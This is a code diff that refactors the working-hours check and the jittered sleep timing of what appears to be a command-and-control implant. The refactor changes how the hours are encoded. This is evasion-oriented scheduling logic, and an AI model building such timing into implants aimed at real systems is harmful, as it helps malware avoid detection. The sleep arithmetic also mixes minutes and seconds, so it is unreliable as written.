@@ -128,47 +128,44 @@ namespace Utils {
 
         ULONG64 GetTimeNow() {
 
-            FILETIME FileTime       = { };
-            LARGE_INTEGER LargeInt  = { };
+            FILETIME file_time       = { };
+            LARGE_INTEGER large_int  = { };
 
-            Ctx->win32.GetSystemTimeAsFileTime(&FileTime);
+            Ctx->win32.GetSystemTimeAsFileTime(&file_time);
 
-            LargeInt.LowPart    = FileTime.dwLowDateTime;
-            LargeInt.HighPart   = (long) FileTime.dwHighDateTime;
+            large_int.LowPart    = file_time.dwLowDateTime;
+            large_int.HighPart   = (long) file_time.dwHighDateTime;
 
-            return LargeInt.QuadPart;
+            return large_int.QuadPart;
         }
 
         BOOL InWorkingHours() {
+            SYSTEMTIME systime = { };
 
-            SYSTEMTIME SystemTime = { };
+            uint32_t work_hours = Ctx->config.hours; 		
+            uint16_t start_time = (work_hours >> 16); 		
+            uint16_t end_time  	= (work_hours & 0xFFFF); 
 
-            uint32_t WorkingHours   = Ctx->config.hours;
-            uint16_t StartHour      = 0;
-            uint16_t StartMinute    = 0;
-            uint16_t EndHour        = 0;
-            uint16_t EndMinute      = 0;
+            // Decode the start time (HHMM)
+            uint16_t start_hour = start_time / 100;  
+            uint16_t start_min 	= start_time % 100;  
 
-            if (((WorkingHours >> 22) & 1) == 0) {
-                return TRUE;
-            }
+    		// Decode the end time (HHMM)
+    		uint16_t end_hour  	= end_time / 100;
+    		uint16_t end_min   	= end_time % 100;
 
-            StartHour   = (WorkingHours >> 17) & 0b011111;
-            StartMinute = (WorkingHours >> 11) & 0b111111;
-            EndHour     = (WorkingHours >> 6) & 0b011111;
-            EndMinute   = (WorkingHours >> 0) & 0b111111;
+    		Ctx->win32.GetLocalTime(&systime);
 
-            Ctx->win32.GetLocalTime(&SystemTime);
+    		// Check if the current time is outside the working hours
+    		if ((systime.wHour < start_hour || systime.wHour > end_hour) ||
+        		(systime.wHour == start_hour && systime.wMinute < start_min) ||
+        		(systime.wHour == end_hour && systime.wMinute > end_min)) {
+        		return FALSE;
+    		}
 
-            if (
-                (SystemTime.wHour < StartHour || SystemTime.wHour > EndHour) ||
-                (SystemTime.wHour == StartHour && SystemTime.wMinute < StartMinute) ||
-                (SystemTime.wHour == EndHour && SystemTime.wMinute > EndMinute)) {
-                return FALSE;
-            }
+    		return TRUE;
+}
 
-            return TRUE;
-        }
 
         VOID Timeout(size_t ms) {
             // Courtesy of Illegacy & Shubakki:
@@ -189,56 +186,54 @@ namespace Utils {
 
     namespace Random {
 
-        ULONG RandomSleepTime() {
+		ULONG RandomSleepTime() {
 
-            SYSTEMTIME sys_time = { };
+			SYSTEMTIME sys_time = { };
 
-            uint32_t work_hours = Ctx->config.hours;
-            uint32_t sleeptime  = Ctx->config.sleeptime * 1000;
-            uint32_t variation  = (Ctx->config.jitter * sleeptime) / 100;
-            uint32_t random     = 0;
+			uint32_t work_hours = Ctx->config.hours;      			
+			uint32_t sleeptime  = Ctx->config.sleeptime * 1000;  	
+			uint32_t variation  = (Ctx->config.jitter * sleeptime) / 100;  
+			uint32_t random     = 0;
 
-            uint16_t start_hour = 0;
-            uint16_t start_min  = 0;
-            uint16_t end_hour   = 0;
-            uint16_t end_min    = 0;
+			uint16_t start_time = (work_hours >> 16);  		
+			uint16_t end_time   = (work_hours & 0xFFFF);  	
 
-            if (!Time::InWorkingHours()) {
-                if (sleeptime) {
+			uint16_t start_hour = start_time / 100;  
+			uint16_t start_min  = start_time % 100;  
+			uint16_t end_hour   = end_time / 100;
+			uint16_t end_min    = end_time % 100;
 
-                    sleeptime   = 0;
-                    start_hour  = (work_hours >> 17) & 0b011111;
-                    start_min   = (work_hours >> 11) & 0b111111;
-                    end_hour    = (work_hours >> 6) & 0b011111;
-                    end_min     = (work_hours >> 0) & 0b111111;
+			Ctx->win32.GetLocalTime(&sys_time);
 
-                    Ctx->win32.GetLocalTime(&sys_time);
+			if (!Time::InWorkingHours()) {  
+				if (sleeptime) {
+					sleeptime = 0;  
 
-                    if (sys_time.wHour == end_hour && sys_time.wMinute > end_min || sys_time.wHour > end_hour) {
-                        sleeptime += (24 - sys_time.wHour - 1) * 60 + (60 - sys_time.wMinute);
-                        sleeptime += start_hour * 60 + start_min;
-                    }
-                    else {
-                        sleeptime += (start_hour - sys_time.wHour) * 60 + (start_min - sys_time.wMinute);
-                    }
+					// get seconds until midnight, add time until start of next working day
+					if (sys_time.wHour > end_hour || (sys_time.wHour == end_hour && sys_time.wMinute > end_min)) {
+						sleeptime += (24 - sys_time.wHour - 1) * 60 + (60 - sys_time.wMinute);  
+						sleeptime += start_hour * 60 + start_min;  								
+					} 
+					else {
+						sleeptime += (start_hour - sys_time.wHour) * 60 + (start_min - sys_time.wMinute);
+					}
 
-                    sleeptime *= MS_PER_SECOND;
-                }
-            }
-            else if (variation) {
-                random = RandomNumber32();
-                random = random % variation;
+					sleeptime *= MS_PER_SECOND;  
+				}
+			}
+			else if (variation) {  				
+				random = RandomNumber32();  	
+				random = random % variation;  	
 
-                if (RandomBool()) {
-                    sleeptime += random;
-                }
-                else {
-                    sleeptime -= random;
-                }
-            }
+				if (RandomBool()) {
+					sleeptime += random;  
+				} else {
+					sleeptime -= random;  
+				}
+			}
 
-            return sleeptime;
-        }
+			return sleeptime;
+		}
 
         ULONG RandomSeed() {
 
